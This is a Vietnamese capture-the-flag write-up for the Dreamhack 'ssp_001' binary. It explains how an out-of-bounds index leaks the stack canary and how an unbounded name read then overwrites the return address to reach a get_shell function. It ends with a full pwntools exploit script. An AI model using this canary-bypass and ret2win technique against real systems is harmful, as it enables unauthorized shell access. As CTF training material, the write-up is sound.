# Challenge: SSP

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/ssp_1/ssp_001)
- Thực thi, chương trình cho một menu lựa chọn sau:
```
int menu()
{
  puts("[F]ill the box");
  puts("[P]rint the box");
  puts("[E]xit");
  return printf("> ");
}
```
- Và 3 chức năng tương ứng:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+4h] [ebp-94h] BYREF
  size_t nbytes; // [esp+8h] [ebp-90h] BYREF
  __int16 buf; // [esp+Eh] [ebp-8Ah] BYREF
  _BYTE v7[64]; // [esp+10h] [ebp-88h] BYREF
  _BYTE v8[64]; // [esp+50h] [ebp-48h] BYREF
  unsigned int v9; // [esp+90h] [ebp-8h]

  v9 = __readgsdword(0x14u);
  memset(v7, 0, sizeof(v7));
  memset(v8, 0, sizeof(v8));
  buf = 0;
  v4 = 0;
  nbytes = 0;
  initialize(argv);
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        read(0, &buf, 2u);
        if ( (char)buf != 70 )
          break;
        printf("box input : ");
        read(0, v7, 0x40u);
      }
      if ( (char)buf != 80 )
        break;
      printf("Element index : ");
      __isoc99_scanf("%d", &v4);
      print_box(v7, v4);
    }
  }
  while ( (char)buf != 69 );
  printf("Name Size : ");
  __isoc99_scanf("%d", &nbytes);
  printf("Name : ");
  read(0, v8, nbytes);
  return 0;
}
```

- Sau khi nhập 'E' và gửi name size và name thì chương trình exit.
- Checksec:
```
+ Arch:       i386-32-little
+ RELRO:      Partial RELRO
+ Stack:      Canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x8048000)
+ Stripped:   No
```

## Giải pháp
- Nhìn sơ qua trong ida thì tôi thấy có hàm get_shell chứa system("/bin/sh"), do đó mục tiêu hướng tới là đẩy địa chỉ get_shell vào ret.
- Do canary mở nên ta buộc phải tìm cách có canary để *vượt rào* thành công.
- Cùng xem qua trước hàm print_box:
```
int __cdecl print_box(int a1, int a2)
{
  return printf("Element of index %d is : %02x\n", a2, *(unsigned __int8 *)(a2 + a1));
}
```
- Ngay ở hàm này có thể khai thác để leak dữ liệu canary bằng cách tìm offset tới canary.
- Sau khi có được canary thì việc của tôi chỉ cần overwrite địa chỉ get_shell vào ret là xong.
> Khai thác Buffer Overflow để overwrite ret.

## Quá trình
- Đầu tiên tính offset tới canary, khi debug tôi thấy canary nằm ở 0x9c mà rsp nằm ở 0x18.
> *offset = 0x9c - 0x18 = 0x84 = 132* thì dữ liệu canary sẽ nằm ở 131, 130, 129 và bytes cuối 00.
- Sau khi leak thành công canary, thì khi input "F" buf ko thể bị tràn bởi vì input giới hạn 64 bytes. Do đó không thể dùng fill để overwrite được.
- Vậy giờ chỉ còn Exit, trong Exit nó có thể nhập tùy ý bytes nên sẽ dùng nó để overwrite ret.
- Trước hết phải tính offset tới canary, sau khi chạy Exit thì canary bây giờ nằm ở 0x98 mà rsp nằm ở 0x58 => *offset = 0x98 - 0x58 = 64*
> payload = b'A'*64 + p32(canary) + p32(0) */bytes rác/* + p32(0) */saved ebp/* + p32(exe.sym['get_shell'] */ret/* 

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('ssp_001', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+313
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 11801)
else:
    p = process([exe.path])
GDB()

### STAGE 1: Leak Canary
canary_leak =  b'00';
sla(b'> ', b'P')
sla(b'index : ', b'129')
p.recvuntil(b'is : ')
canary_leak += (p.recvline()[:-1])[::-1]
sla(b'> ', b'P')
sla(b'index : ', b'130')
p.recvuntil(b'is : ')
canary_leak += (p.recvline()[:-1])[::-1]
sla(b'> ', b'P')
sla(b'index : ', b'131')
p.recvuntil(b'is : ')
canary_leak += (p.recvline()[:-1])[::-1]
canary_leak = canary_leak[::-1]
canary_leak = int(canary_leak, 16)
info("Canary leak: " + hex(canary_leak))

### STAGE 2: Get_shell
sla(b'> ', b'E')
sla(b'Size : ', b'200')
payload = flat(
    b'A'*64,
    p32(canary_leak),
    p32(0),
    p32(0),
    p32(exe.sym['get_shell']),
    )
sla(b'Name : ', payload)

p.interactive()

```
